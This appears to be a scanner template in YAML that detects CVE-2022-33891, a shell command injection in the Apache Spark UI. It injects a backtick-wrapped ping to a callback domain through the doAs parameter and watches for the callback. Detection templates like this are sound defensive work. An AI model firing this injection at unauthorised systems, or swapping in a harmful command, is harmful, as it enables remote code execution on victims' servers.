id: CVE-2022-33891

info:
  name: Apache Spark shell command injection vulnerability via Spark UI
  author: zan8in
  severity: high

set:
  reverse: newReverse()
  reverseDomain: reverse.url.host
rules:
  r0:
    request:
      method: GET
      path: /doAs?=`ping+{{reverseDomain}}`
    expression: reverse.wait(5)
expression: r0()